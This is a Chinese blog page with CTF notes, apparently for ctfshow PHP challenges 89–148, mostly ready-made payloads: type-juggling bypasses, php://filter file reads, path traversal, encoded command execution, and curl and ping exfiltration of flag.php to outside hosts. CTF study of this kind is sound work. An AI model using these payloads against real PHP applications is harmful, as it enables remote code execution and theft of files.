@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"hzy2003628.top","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="PHP特性">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP特性">
+<meta property="og:url" content="https://hzy2003628.top/2022/06/14/PHP%E7%89%B9%E6%80%A7/index.html">
+<meta property="og:site_name" content="凪卄">
+<meta property="og:description" content="PHP特性">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-06-14T14:56:22.385Z">
+<meta property="article:modified_time" content="2022-06-22T12:00:59.219Z">
+<meta property="article:author" content="宋伟浩">
+<meta property="article:tag" content="博客">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://hzy2003628.top/2022/06/14/PHP%E7%89%B9%E6%80%A7/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>PHP特性 | 凪卄</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="凪卄" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">凪卄</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">知识型学习记录</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://hzy2003628.top/2022/06/14/PHP%E7%89%B9%E6%80%A7/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="宋伟浩">
+      <meta itemprop="description" content="站在巨人的肩上">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="凪卄">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          PHP特性
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-06-14 22:56:22" itemprop="dateCreated datePublished" datetime="2022-06-14T22:56:22+08:00">2022-06-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-06-22 20:00:59" itemprop="dateModified" datetime="2022-06-22T20:00:59+08:00">2022-06-22</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>PHP特性</p>
+<span id="more"></span>
+
+<h3 id="89"><a href="#89" class="headerlink" title="89"></a>89</h3><p>提示：通过数组绕过<br>解答：输入 &#x2F;?num[]&#x3D;1 看到flag<br>###90<br>提示:因为我们提交的参数值默认就是字符串类型 所以我们可以直接输入 ?num&#x3D;4476%23<br>分析:get方式传入num，如果num&#x3D;&#x3D;&#x3D;4476就die，然后intval判断num<br>解答:输入?num&#x3D;4476%23 可以看到flag<br>###91<br>提示:考查正则表达式是匹配方法,可以通过 %0a 绕过 payload： abc%0aphp<br>分析:这里主要的突破点就是&#x2F;m，我们可以看到第一个preg_match()函数，有个&#x2F;m，而第二个正则则没有，我们可以利用换行进行绕过<br>解答输入&#x2F;?cmd&#x3D;abc%0aphp 可以看到flag(%0a是换行的意思)</p>
+<h3 id="92"><a href="#92" class="headerlink" title="92"></a>92</h3><p>提示:intval()函数如果$base为0则$var中存在字母的话遇到字母就停止读取 但是e这个字母比较特殊，可以在PHP中不是科学计数法。<br>所以为了绕过前面的&#x3D;&#x3D;4476我们就可以构造 4476e123 其实不需要是e其他的字母也可以<br>分析:90属于强类型比较（ &#x3D;&#x3D;&#x3D; ） 92属于弱类型（ &#x3D;&#x3D; ）在若比较中（&#x3D;&#x3D;），4476a与4476相等。<br>解答:输入&#x2F;?num&#x3D;0x117c 可以得到flag</p>
+<h3 id="93"><a href="#93" class="headerlink" title="93"></a>93</h3><p>提示:过滤了字母但是我们可以使用其他进制就是计算 0b?? : 二进制0??? : 八进制 0X?? : 16进制 payload ： ?num&#x3D;010574<br>分析:过滤了字母，十六进制弄不了，那就改八进制<br>解答:输入?num&#x3D;010574</p>
+<h3 id="94"><a href="#94" class="headerlink" title="94"></a>94</h3><p>提示:在93的基础上过滤了开头为0的数字 这样的话就不能使用进制转换来进行操作 我们可以使用小数点来进行操作。这样通过intval()函数就可以变为int类型的4476 ?num&#x3D;4476.0<br>分析:对于strpos()函数，我们可以利用换行进行绕过（%0a）payload:?num&#x3D;%0a010574<br>也可以小数点绕过payload：?num&#x3D;4476.0<br>因为intval()函数只读取整数部分还可以八进制绕过(%20是空格的url编码形式)<br>解答:输入?num&#x3D;4476.0</p>
+<h3 id="95"><a href="#95" class="headerlink" title="95"></a>95</h3><p>提示:可以通过8进制绕过但是前面必须多加一个字节 ?num&#x3D;+010574或者?num&#x3D;%2b010574<br>分析:又增加过滤了<br>解答:输入?num&#x3D;%2b010574</p>
+<h3 id="96"><a href="#96" class="headerlink" title="96"></a>96</h3><p>提示:在linux下面表示当前目录是 .&#x2F; 所以我们的payload： u&#x3D;.&#x2F;flag.php<br>解答:输入??u&#x3D;.&#x2F;flag.php</p>
+<h3 id="97"><a href="#97" class="headerlink" title="97"></a>97</h3><p>提示:通过数组绕过 a[]&#x3D;1&amp;b[]&#x3D;2<br>分析:md5强比较，数组绕过<br>解答:post输入a[]&#x3D;1&amp;b[]&#x3D;2</p>
+<h3 id="100"><a href="#100" class="headerlink" title="100"></a>100</h3><p>提示:这道题基本上没有对参数进行过滤,所以直接执行命令<br>?v1&#x3D;21&amp;v2&#x3D;var_dump($ctfshow)&#x2F;<em>&amp;v3&#x3D;</em>&#x2F;;<br>分析:v1要为数字，v2是指令，v3必须含;<br>解答:输入?v1&#x3D;1&amp;v2&#x3D;var_dump($ctfshow)&amp;v3&#x3D;;</p>
+<h3 id="101"><a href="#101" class="headerlink" title="101"></a>101</h3><p>提示:?v1&#x3D;1&amp;v2&#x3D;echo new Reflectionclass&amp;v3&#x3D;;替换0x2d为-,最后一位需要爆破16次，题目给的flag少一位<br>分析:这题过滤了&#x2F;,*等，所以只能用反射类解，少一位进行爆破<br>解答:输入?v1&#x3D;1&amp;v2&#x3D;echo new ReflectionClass&amp;v3&#x3D;;</p>
+<h3 id="102"><a href="#102" class="headerlink" title="102"></a>102</h3><p>提示:GET<br>v2&#x3D;115044383959474e6864434171594473&amp;v3&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-<br>decode&#x2F;resource&#x3D;2.php<br>POST v1&#x3D;hex2bin<br>访问1.php后查看源代码获得flag<br>分析:这里要求v2是数字，并且截取第三位后的字符作为call_user_func的第二个参数。<br>解答:get v2&#x3D;115044383959474e6864434171594473&amp;v3&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;1.php post: v1&#x3D;hex2bin<br>之后再访问1.php,查看源码</p>
+<h3 id="103"><a href="#103" class="headerlink" title="103"></a>103</h3><p>提示:GET<br>v2&#x3D;115044383959474e6864434171594473&amp;v3&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-<br>decode&#x2F;resource&#x3D;2.php<br>POST，v1&#x3D;hex2bin<br>访问1.php后查看源代码获得flag<br>解答:get v2&#x3D;115044383959474e6864434171594473&amp;v3&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;1.php post: v1&#x3D;hex2bin<br>之后再访问1.php,查看源码</p>
+<h3 id="104"><a href="#104" class="headerlink" title="104"></a>104</h3><p>提示:payload:aaK1STfY<br>0e76658526655756207688271159624026011393<br>aaO8zKZF<br>0e89257456677279068558073954252716165668<br>分析:sha1()函数无法处理数组类型，将报错并返回false,sha1()函数的弱相等<br>解答:get,?v2&#x3D;a;post,v1&#x3D;a</p>
+<h3 id="105"><a href="#105" class="headerlink" title="105"></a>105</h3><p>提示:php的变量覆盖 payload： GET: ?suces&#x3D;flag POST: error&#x3D;suces<br>分析:变量覆盖<br>解答:get传参,?suces&#x3D;flag;post传参,error&#x3D;suces</p>
+<h3 id="106"><a href="#106" class="headerlink" title="106"></a>106</h3><p>分析:sha1弱比较;aaroZmOk;aaK1STfY;aaO8zKZF;aa3OFF9m<br>解答:get传参,?v2&#x3D;aaroZmOk;post传参,v1&#x3D;aa3OFF9m</p>
+<h3 id="107"><a href="#107" class="headerlink" title="107"></a>107</h3><p>提示:GET: ?v3&#x3D;240610708 POST: v1&#x3D;flag&#x3D;0<br>分析:v1&#x3D;v2&#x3D;flag&#x3D;md5 v3<br>parse_str — 将字符串解析成多个变量,如果设置了第二个变量 result， 变量将会以数组元素的形式存入到这个数组，作为替代。<br>解答::get传参?v3&#x3D;QNKCDZO;post传参,v1&#x3D;flag&#x3D;0</p>
+<h3 id="108"><a href="#108" class="headerlink" title="108"></a>108</h3><p>提示:ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。<br>搜索字 母的字符是大小写敏感的。 ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配<br>?c&#x3D;a%00778<br>分析:ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配<br>0x36d的十进制为877，strrev是反转字符串，778<br>解答:输入?c&#x3D;a%00778</p>
+<h3 id="109"><a href="#109" class="headerlink" title="109"></a>109</h3><p>提示:Exception 异常处理类 <a target="_blank" rel="noopener" href="http://c.biancheng.net/view/6253.html">http://c.biancheng.net/view/6253.html</a> payload:<br>?v1&#x3D;Exception&amp;v2&#x3D;system(‘cat fl36dg.txt’) ?v1&#x3D;Reflectionclass&amp;v2&#x3D;system(‘cat fl36dg.txt’)<br>分析:先来看下这个正则表达式&#x2F;[a-zA-Z]+&#x2F; 匹配至少有一个字母的字符串<br>所以我们只要让new后面有个类不报错以后，就可以随意构造了。我们随便找个php中的内置类并且可以直接echo输出的就可以了。<br>解答:1.?v1&#x3D;ReflectionClass&amp;v2&#x3D;system(‘ls’)<br>2.?v1&#x3D;ReflectionClass&amp;v2&#x3D;system(‘ls’)</p>
+<h3 id="110"><a href="#110" class="headerlink" title="110"></a>110</h3><p>提示:php内置类 利用 FilesystemIterator 获取指定目录下的所有文件<br>getcwd()函数 获取当前工作目录 返回当前工作目录 payload: ?v1&#x3D;FilesystemIterator&amp;v2&#x3D;getcwd<br>分析:FilesystemIterator获取目录文件,getcwd()函数取得当前工作目录<br>解答:输入?v1&#x3D;FilesystemIterator&amp;v2&#x3D;getcwd 之后访问fl36dga.txt</p>
+<h3 id="112"><a href="#112" class="headerlink" title="112"></a>112</h3><p>提示:php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php<br>php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UCS-2LE.UCS-2BE&#x2F;resource&#x3D;flag.php<br>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.quoted-printable-encode&#x2F;resource&#x3D;flag.php<br>compress.zlib:&#x2F;&#x2F;flag.php<br>分析:is_file()函数检查指定的文件名是否是正常的文件。<br>我们的目的是不能让is_file检测出是文件，并且 highlight_file可以识别为文件。这时候可以利用php伪协议。<br>解答:可以直接用不带任何过滤器的filter伪协议file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php</p>
+<h3 id="113"><a href="#113" class="headerlink" title="113"></a>113</h3><p>示:&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;p<br>roc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;pro<br>c&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;<br>self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;se<br>lf&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php<br>分析:1.可以使用压缩过滤器绕过<br>2.显示的内容是根目录下的内容多次重复后绕过is_file。<br>解答:1.输入?file&#x3D;compress.zlib:&#x2F;&#x2F;flag.php<br>2.?file&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root<br>&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self<br>&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc<br>&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root<br>&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</p>
+<h3 id="114"><a href="#114" class="headerlink" title="114"></a>114</h3><p>提示:payload: php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php<br>解答:输入?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php</p>
+<h3 id="115"><a href="#115" class="headerlink" title="115"></a>115</h3><p>提示:payload:num?%0c36,%0c&#x3D;&#x3D;\f<br>分析:发现除了±.号以外还有只剩下%0c也就是换页符了<br>解答:输入?num&#x3D;%0C36</p>
+<h3 id="123"><a href="#123" class="headerlink" title="123"></a>123</h3><p>提示:POST: CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;echo $flag<br>分析:PHP变量名应该只有数字字母下划线,同时GET或POST方式传进去的变量名,会自动将空格+ . 转换为_<br>但是有一个特性可以绕过,使变量名出现.之类的<br>特殊字符[, GET或POST方式传参时,变量名中的也会被替换为_,但其后的字符就不会被替换了<br>解答:get传参,?$fl0g&#x3D;flag_give_me;;post传参,CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;eval($a[0])</p>
+<h3 id="125"><a href="#125" class="headerlink" title="125"></a>125</h3><p>提示:GET:?1&#x3D;flag.php POST:CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;highlight_file($_GET[1])<br>解答:GET传参,?1&#x3D;flag.php;POST传参,CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;highlight_file($_GET[1])<br>###126<br>提示:1.GET:?a&#x3D;1+fl0g&#x3D;flag_give_mePOST:CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;parse_str($a[1])<br>2.GET:?$fl0g&#x3D;flag_give_mePOST:CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;assert($a[0])<br>解答:GET传参,?a&#x3D;1+fl0g&#x3D;flag_give_me;POST传参CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;parse_str($a[1])</p>
+<h3 id="127"><a href="#127" class="headerlink" title="127"></a>127</h3><p>提示:GET:?ctf show&#x3D;ilove36d<br>分析:过滤了_,用空格绕过waf<br>解答:get传参:?ctf show&#x3D;ilove36d</p>
+<h3 id="128"><a href="#128" class="headerlink" title="128"></a>128</h3><p>提示: <em>()是一个函数<br><em>()&#x3D;&#x3D;gettext() 是gettext()的拓展函数，开启text扩展。需要php扩展目录下有php_gettext.dll<br>get_defined_vars()函数<br>get_defined_vars — 返回由所有已定义变量所组成的数组 这样可以获得 $flag<br>payload: ?f1&#x3D;</em>&amp;f2&#x3D;get_defined_vars<br>分析:第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数<br>解答:输入?f1&#x3D;</em>&amp;f2&#x3D;get_defined_vars</p>
+<h3 id="129"><a href="#129" class="headerlink" title="129"></a>129</h3><p>提示: 目录穿越<br>stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写） payload: &#x2F;ctfshow&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php 查看源代码获得 flag<br>分析:构造的f中有ctfshow则执行readfile函数，同时还要不影响flag.php的读取<br>解答:get传参:?f&#x3D;&#x2F;ctfshow&#x2F;..&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</p>
+<h3 id="130"><a href="#130" class="headerlink" title="130"></a>130</h3><p>提示:直接绕过正则表达式： f&#x3D;ctfshow<br>解答:post:f&#x3D;ctfshow</p>
+<h3 id="131"><a href="#131" class="headerlink" title="131"></a>131</h3><p>提示:正则表达式是溢出 <a target="_blank" rel="noopener" href="https://www.laruence.com/2010/06/08/1579.html">https://www.laruence.com/2010/06/08/1579.html</a> 大概意思就是在php中正则表达式进行匹配有一定的限制，超过限制直接返回false<br>解答:post:f&#x3D;ctfshow</p>
+<h3 id="132"><a href="#132" class="headerlink" title="132"></a>132</h3><p>提示: php中&amp;&amp;和||运算符应用 访问&#x2F;robots.txt,之后访问&#x2F;admin，获得源代码 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/hurry-up/p/10220082.html">https://www.cnblogs.com/hurry-up/p/10220082.html</a><br> 对于“与”（&amp;&amp;） 运算： x &amp;&amp; y 当x为false时，直接跳过，<br>不执行y； 对于“或”（||） 运算 ： x||y 当x为true时，直接跳过，不执行y。 payload: ?a&#x3D;admin&amp;b&#x3D;admin&amp;c&#x3D;admin<br>分析:访问&#x2F;admin&#x2F;即可进入源码界面;只需$username &#x3D;&#x3D;&#x3D;”admin”成立了即可同时code&#x3D;admin<br>解答:输入?a&#x3D;admin&amp;b&#x3D;admin&amp;c&#x3D;admin</p>
+<h3 id="133"><a href="#133" class="headerlink" title="133"></a>133</h3><p>提示:<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46091464/article/details/109095382">https://blog.csdn.net/qq_46091464/article/details/109095382</a><br>分析:禁止了命令执行的函数，并且没有写入权限<br>解答:反弹shell 或者curl外带 或者盲注这里的话反弹没有成功，但是可以外带。<br>payload: curl -X POST -F xx&#x3D;@flag.php <a target="_blank" rel="noopener" href="http://xxx;curl/">http://xxx；curl</a> -F 将flag文件上传到Burp的 Collaborator Client </p>
+<h3 id="134"><a href="#134" class="headerlink" title="134"></a>134</h3><p>提示:php变量覆盖 利用点是 extract($_POST); 进行解析$_POST数组。<br> 先将GET方法请求的解析成变量，然后在利用extract() 函数从数组中将变量导入到当前的符号表。<br>所以payload: ?_POST[key1]&#x3D;36d&amp;_POST[key2]&#x3D;36d<br>分析:POST数组的覆盖<br>解答:输入?_POST[key1]&#x3D;36d&amp;_POST[key2]&#x3D;36d</p>
+<h3 id="135"><a href="#135" class="headerlink" title="135"></a>135</h3><p>提示:<code>$F</code>;+ping <code>cat flag.php|awk &#39;NR==2&#39;</code>.6x1sys.dnslog.cn<br>#通过ping命令去带出数据，然后awk NR一排一排的获得数据<br>分析:Linux中的cp命令<br>解答:先将flag写入1.txt;&#x2F;?F&#x3D;<code>$F</code>; cp flag.php 1.txt<br>再访问1.txt;&#x2F;1.txt</p>
+<h3 id="136"><a href="#136" class="headerlink" title="136"></a>136</h3><p>提示:payload: ls &#x2F;|tee 1 访问1下载发现根目录下有flag payload: cat &#x2F;f149_15_h3r3|tee 2 访问下载就OK<br>分析:tee file1 file2 &#x2F;&#x2F;复制文件<br>ls|tee 1.txt &#x2F;&#x2F;命令输出<br>解答:?c&#x3D;ls |tee 1;&#x2F;&#x2F;将根目录下的内容写入1<br>访问1，下载文件发现f149_15_h3r3;?c&#x3D;nl &#x2F;f149_15_h3r3|tee 1<br>访问1，下载文件得flag</p>
+<h3 id="137"><a href="#137" class="headerlink" title="137"></a>137</h3><p>提示:call_user_func()函数的使用 payload: POST: ctfshow&#x3D;ctfshow::getFlag<br>分析:payload: POST: ctfshow&#x3D;ctfshow::getFlag<br>解答:POST传参：ctfshow&#x3D;ctfshow::getFlag</p>
+<h3 id="138"><a href="#138" class="headerlink" title="138"></a>138</h3><p>提示:POST: ctfshow[0]&#x3D;ctfshow&amp;ctfshow[1]&#x3D;getFlag<br>分析:运用了call_user_func()函数<br>解答:POST传参：ctfshow[0]&#x3D;ctfshow&amp;ctfshow[1]&#x3D;getFlag</p>
+<h3 id="140"><a href="#140" class="headerlink" title="140"></a>140</h3><p>提示: 函数的利用 payload: f1&#x3D;usleep&amp;f2&#x3D;usleep<br>分析:弱比较函数调用<br>可以看到只要我们让intval($code)为0就可以了<br>intval会将非数字字符转换为0，也就是说intval(‘a’)&#x3D;&#x3D;0 intval(‘.’)&#x3D;&#x3D;0intval(‘&#x2F;‘)&#x3D;&#x3D;0<br>解答:POST传参：f1&#x3D;md5&amp;f2&#x3D;md5</p>
+<h3 id="141"><a href="#141" class="headerlink" title="141"></a>141</h3><p>提示:考察命令执行和绕过return 应该说运算符都可以绕过 这里用羽师傅给的一个脚本取反命令执行<br>?v1&#x3D;10&amp;v2&#x3D;0&amp;v3&#x3D;-(%8c%86%8c%8b%9a%92)(%9c%9e%8b%df%99%d5);<br>分析:&#x2F;^\W+$&#x2F; 作用是匹配非数字字母下划线的字符<br>解答:输入?v1&#x3D;1&amp;v3&#x3D;-(<del>%8C%86%8C%8B%9A%92)(</del>%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8F)-&amp;v2&#x3D;1</p>
+<h3 id="142"><a href="#142" class="headerlink" title="142"></a>142</h3><p>提示:0和0x0绕过 这里绕过因为是因为当成了8进制和16进制<br>解答:输入?v1&#x3D;0</p>
+<h3 id="143"><a href="#143" class="headerlink" title="143"></a>143</h3><p>提示:位运算都可以进行构造字符 ?v1&#x3D;10&amp;v2&#x3D;0&amp;v3&#x3D;<em>(“%0c%19%0c%5c%60%60”^”%7f%60%7f%28%05%0d”) (“%0e%0c%00%00”^”%60%60%20%2a”)?&gt;<br>解答:输入 ?v1&#x3D;10&amp;v2&#x3D;0&amp;v3&#x3D;</em>(“%0c%19%0c%5c%60%60”^”%7f%60%7f%28%05%0d”) (“%0e%0c%00%00”^”%60%60%20%2a”)?&gt;</p>
+<h3 id="144"><a href="#144" class="headerlink" title="144"></a>144</h3><p>提示:?v1&#x3D;10&amp;v2&#x3D;(%8c%86%8c%8b%9a%92)(%9c%9e%8b%df%99%d5);&amp;v3&#x3D;-<br>解答:输入?v1&#x3D;1<br>&amp;v2&#x3D;-(“%0c%06%0c%0b%05%0d”^”%7f%7f%7f%7f%60%60”)(“%0b%01%03%00%06%0c%01%07%01%0f%08%0f”^”%7f%60%60%20%60%60%60%60%2f%7f%60%7f”)<br>&amp;v3&#x3D;1</p>
+<h3 id="145"><a href="#145" class="headerlink" title="145"></a>145</h3><p>提示:?v1&#x3D;%0a1&amp;v2&#x3D;%0a0&amp;v3&#x3D;?(<del>%8c%86%8c%8b%9a%92)(</del>%9c%9e%8b%df%99%d5):<br>分析:三目运算符<br>解答:输入?v1&#x3D;1&amp;v3&#x3D;|(<del>%8C%86%8C%8B%9A%92)(</del>%9C%9E%8B%DF%99%D5)|&amp;v2&#x3D;1</p>
+<h3 id="146"><a href="#146" class="headerlink" title="146"></a>146</h3><p>提示:?v1&#x3D;1&amp;v2&#x3D;1&amp;v3&#x3D;|(<del>%8c%86%8c%8b%9a%92)(</del>%9c%9e%8b%df%99%d5)|<br>解答:输入?v1&#x3D;1&amp;v2&#x3D;1&amp;v3&#x3D;|(<del>%8c%86%8c%8b%9a%92)(</del>%9c%9e%8b%df%99%d5)|</p>
+<h3 id="147"><a href="#147" class="headerlink" title="147"></a>147</h3><p>提示:php里默认命名空间是\，所有原生函数和类都在这个命名空间中。<br>普通调用一个函数,如果直接写函数名function_name()调用,调用的时候其实相当于写了一个相对路径;<br>而如果写\function_name()这样调用函数;则其实是写了一个绝对路径。 如果你在其他namespace里调用系统类,就必须写绝对路径这种写法<br>解答:GET传参 ?show&#x3D;}system(“cat f*”);&#x2F;*<br>POST传参 ctf&#x3D;\create_function</p>
+<h3 id="148"><a href="#148" class="headerlink" title="148"></a>148</h3><p>提示:payload ?code&#x3D;(“%0c%19%0c%5c%60%60”^”%7f%60%7f%28%05%0d”) (“%09%01%03%01%06%02”^”%7d%60%60%21%60%28”);<br>预期解是使用中文 ?code&#x3D;$哈&#x3D;”</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/06/07/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9F%A5%E8%AF%86%E7%82%B9/" rel="prev" title="命令执行函数">
+      <i class="fa fa-chevron-left"></i> 命令执行函数
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/06/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="next" title="命令执行">
+      命令执行 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
